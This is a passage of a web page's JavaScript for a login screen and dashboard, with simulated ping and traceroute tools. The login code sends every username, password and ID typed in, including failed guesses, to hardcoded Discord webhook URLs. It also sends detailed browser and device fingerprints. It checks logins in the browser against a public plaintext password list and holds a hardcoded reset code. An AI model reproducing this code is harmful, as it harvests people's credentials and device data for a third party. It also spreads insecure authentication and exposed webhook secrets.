            const delay = Math.floor(Math.random() * 100) + 30; // 30-130ms
            if (Math.random() < 0.1) { // 10% packet loss
                pings.push(`Request timed out.`);
                lost++;
            } else {
                pings.push(`Reply from ${target} (simulated): bytes=32 time=${delay}ms TTL=64`);
            }
        }
        setTimeout(() => {
            outputEl.textContent += pings.join('\n') + `\n\nPing statistics for ${target}:\n    Packets: Sent = 4, Received = ${4 - lost}, Lost = ${lost} (${(lost / 4 * 100).toFixed(0)}% loss)`;
            this.notify(`Ping to ${target} complete (simulated).`, 'success', 3000);
        }, 1500);
      },
      simulateTraceroute: function() {
        const target = document.getElementById('tracerouteTarget').value;
        const outputEl = document.getElementById('tracerouteOutput');
        if (!target) {
            outputEl.textContent = 'Please enter a target.';
            return;
        }

        this.notify(`Tracing route to ${target} (simulated)...`, 'info');
        outputEl.textContent = `Tracing route to ${target} (simulated) over a maximum of 30 hops:\n\n`;
        let hops = [];
        const numHops = Math.floor(Math.random() * 10) + 5; // 5-15 hops
        for (let i = 1; i <= numHops; i++) {
            const ip = `192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
            const ms1 = Math.floor(Math.random()*30)+1;
            const ms2 = Math.floor(Math.random()*30)+1;
            const ms3 = Math.floor(Math.random()*30)+1;
            hops.push(`${String(i).padStart(2, ' ')}   ${ms1} ms   ${ms2} ms   ${ms3} ms  ${ip}`);
        }
        hops.push(`Trace complete. Final destination ${target} (simulated).`);

        setTimeout(() => {
            outputEl.textContent += hops.join('\n');
            this.notify(`Traceroute to ${target} complete (simulated).`, 'success', 3000);
        }, 2500);
      },

    }; /* End dashboard object */

    // Login System JavaScript (wrapped in an IIFE as before)
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // New Webhooks for enhanced logging (as per user's request from original)
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P9G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHjGS39lC6YRZ-1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnOQTEislM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = [];
      let loginTime = null;

      // Show/hide password toggle
      eventManager.addListener(showPasswordCheckbox, 'change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      });

      // Fetch user JSON data on load
      // Removed from window.onload and instead just runs.
      fetch(USER_JSON_URL)
        .then(res => {
            if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
            return res.json();
        })
        .then(data => {
          users = data;
        })
        .catch(e => {
          users = [];
          console.error('Failed to load user JSON data:', e);
          dashboard.notify('Failed to load user whitelist.', 'error');
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          if (loginBox) loginBox.classList.add('flashing');
          setTimeout(() => {
            if (loginBox) loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = { title: "Username Logging", color: 0x3498db, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = { title: "Password Logging", color: 0xe74c3c, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = { title: "Identifier Logging", color: 0x2ecc71, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = { title: "Invalid Username Logging", color: 0xf39c12, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = { title: "Invalid Password Logging", color: 0xe67e22, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = { title: "Invalid Identifier Logging", color: 0xd35400, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }] };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (unchanged)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System", color: 0xff0000, fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username, inline: true }, { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true }, { name: "Role Type", value: data.user.role || "N/A", inline: true }, { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true }, { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
          ]
        };
      }
      function buildBrowserLoggingEmbed(data) {
        const nav = navigator; return {
          title: "Browser Logging System", color: 0x00ff00, fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true }, { name: "Browser Language", value: nav.language || "Unknown", inline: true }, { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false }, { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true }, { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true }, { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true }, { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true }, { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true }, { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
          ]
        };
      }
      function buildDeviceLoggingEmbed(data) {
        const nav = navigator; const battery = data.batteryStatus; return {
          title: "Device Logging System", color: 0x0000ff, fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true }, { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true }, { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true }, { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true }, { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true }, { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true }, { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true }, { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true }, { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true }
          ]
        };
      }
      function buildConnectionLoggingEmbed(data) {
        const nav = navigator; return {
          title: "Connection Logging System", color: 0xffff00, fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true }, { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true }, { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true }, { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true }, { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false }, { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true }, { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false }, { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false }, { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true }, { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true }, { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }
      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System", color: 0x00ffff, fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime || "Unknown", inline: true }, { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true }, { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false }, { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false }, { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false }, { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true }, { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true }, { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
            { name: "Idle Time", value: data.idleTime || "0s", inline: true }, { name: "Active Time", value: data.activeTime || "Unknown", inline: true }, { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          dashboard.notify('Login failed: All fields are required.', 'error');
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown", username, password, userID, attempts
        );

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found.');
          dashboard.notify('Login failed: User not found.', 'error');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          dashboard.notify('Login failed: Incorrect password.', 'error');
          return;
        }

        // Correct login
        attempts = 5;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);
        dashboard.notify('Login successful!', 'success', 5000);


        // New Pre-loader transition to Dashboard
        const loadingOverlay = document.getElementById('loadingOverlay');
        const initialLoadingBox = document.getElementById('initialLoadingBox');

        initialLoadingBox.classList.add('hidden'); // Start fade out current
        initialLoadingBox.addEventListener('animationend', () => {
            if (initialLoadingBox.classList.contains('hidden')) { // Only act on fade out completion
                initialLoadingBox.remove();
                
                const newLoadingBox = document.createElement('div');
                newLoadingBox.id = 'dashboardLoadingBox';
                newLoadingBox.className = 'loading-box-animation';
                newLoadingBox.textContent = 'Initializing Dashboard...';
                loadingOverlay.appendChild(newLoadingBox);

                // Ensure it appears immediately then fades/scales
                newLoadingBox.style.animation = 'none'; // Clear previous animation state
                void newLoadingBox.offsetWidth; // Trigger reflow
                newLoadingBox.style.animation = 'fadeInScale 1.5s forwards';

                setTimeout(() => {
                    newLoadingBox.classList.add('hidden');
                    newLoadingBox.addEventListener('animationend', () => {
                        if (newLoadingBox.classList.contains('hidden')) { // Ensure it's the fade-out anim
                            loadingOverlay.style.display = 'none';
                            
                            // Show dashboard and hide login
                            document.getElementById('loginBox').style.display = 'none';
                            document.getElementById('dashboard').style.display = 'flex'; // Use flex for column layout
                            document.body.className = 'dashboard-body'; // Apply dashboard body class
                            
                            // Update user info in dashboard
                            document.getElementById('loggedInUser').textContent = user.name || user.username;
                            document.getElementById('loggedInID').textContent = userID;
                            if(document.getElementById('settingsProfileUser')) document.getElementById('settingsProfileUser').textContent = user.name || user.username;
                            if(document.getElementById('settingsProfileID')) document.getElementById('settingsProfileID').textContent = userID;

                            // Initialize dashboard functionality
                            dashboard.init();
                        }
                    }, { once: true });
                }, 2000); // Display "Initializing Dashboard..." for 2 seconds
            }
        }, { once: true });

      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown", username, password, userID
          );
          
          showResetPopup();
          disableInputs();
          dashboard.notify('Maximum login attempts exceeded.', 'error');
        } else {
          if (attempts <= 3) {
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        if (attemptsText) attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        if (usernameInput) usernameInput.disabled = true;
        if (passwordInput) passwordInput.disabled = true;
        if (userIDInput) userIDInput.disabled = true;
        if (submitBtn) submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        if (usernameInput) usernameInput.disabled = false;
        if (passwordInput) passwordInput.disabled = false;
        if (userIDInput) userIDInput.disabled = false;
        if (submitBtn) submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        if (resetPopup) {
            resetPopup.style.display = 'block';
            resetPopup.setAttribute('aria-hidden', 'false');
            resetField.focus();
            dashboard.notify('Reset password prompt appeared due to failed attempts.', 'warning');
        }
      }

      // Hide reset popup
      function hideResetPopup() {
        if (resetPopup) {
            resetPopup.style.display = 'none';
            resetPopup.setAttribute('aria-hidden', 'true');
            resetField.value = '';
        }
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = { title: "🔔 Reset Box Detected", color: 0xffff00, fields: [{ name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: userID, inline: true }, { name: "Entered Code", value: enteredCode, inline: false }, { name: "Time", value: new Date().toLocaleString(), inline: false }] };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJ_keiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt", color: isCorrect ? 0x00ff00 : 0xff0000, fields: [
            { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true }, { name: "Reset Code", value: enteredCode, inline: false }, { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 5;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          dashboard.notify('Login attempts reset successfully.', 'success');
        } else {
          alert('Incorrect reset code.');
          dashboard.notify('Incorrect reset code entered.', 'error');
        }
      }

      // Attach event listeners
      if (submitBtn) eventManager.addListener(submitBtn, 'click', submitLogin);
      if (resetBtn) eventManager.addListener(resetBtn, 'click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      eventManager.addListener(document, 'keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup && resetPopup.style.display === 'block') {
            e.preventDefault(); // Prevent default for 'Enter' in reset field
            resetCounter();
          } else if (document.getElementById('loginBox') && document.getElementById('loginBox').style.display !== 'none') {
            e.preventDefault(); // Prevent default for 'Enter' in login fields
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();

      // New: Initial loading screen sequence for login
      document.addEventListener('DOMContentLoaded', () => {
        const loadingOverlay = document.getElementById('loadingOverlay');
        const initialLoadingBox = document.getElementById('initialLoadingBox');
        const loginBoxElement = document.getElementById('loginBox');

        // Initial system loading
        loadingOverlay.style.display = 'flex';
        initialLoadingBox.textContent = 'Initializing System..';
        initialLoadingBox.style.display = 'flex'; // Ensure visible

        setTimeout(() => {
            initialLoadingBox.classList.add('hidden'); // Fade out first box
            initialLoadingBox.addEventListener('animationend', () => {
                if (initialLoadingBox.classList.contains('hidden')) { // Ensure this specific animation is done
                    initialLoadingBox.remove();
                    const keySystemLoadingBox = document.createElement('div');
                    keySystemLoadingBox.id = 'keySystemLoadingBox';
                    keySystemLoadingBox.className = 'loading-box-animation';
                    keySystemLoadingBox.textContent = 'Loading Key System...';
                    loadingOverlay.appendChild(keySystemLoadingBox);
                    
                    keySystemLoadingBox.style.animation = 'none'; // Reset to apply fresh animation
                    void keySystemLoadingBox.offsetWidth; // Trigger reflow
                    keySystemLoadingBox.style.animation = 'fadeInScale 1.5s forwards';

                    setTimeout(() => {
                        keySystemLoadingBox.classList.add('hidden');
                        keySystemLoadingBox.addEventListener('animationend', () => {
                            if (keySystemLoadingBox.classList.contains('hidden')) { // Ensure it's the fade out anim
                                loadingOverlay.style.display = 'none';
                                loginBoxElement.style.display = 'block'; // Show login box
                            }
                        }, { once: true });
                    }, 2000); // Display "Loading Key System..." for 2 seconds
                }
            }, { once: true });
        }, 2000); // Display "Initializing System..." for 2 seconds
      });


    })(); /* End Login System IIFE */
  </script>

</body>
</html>
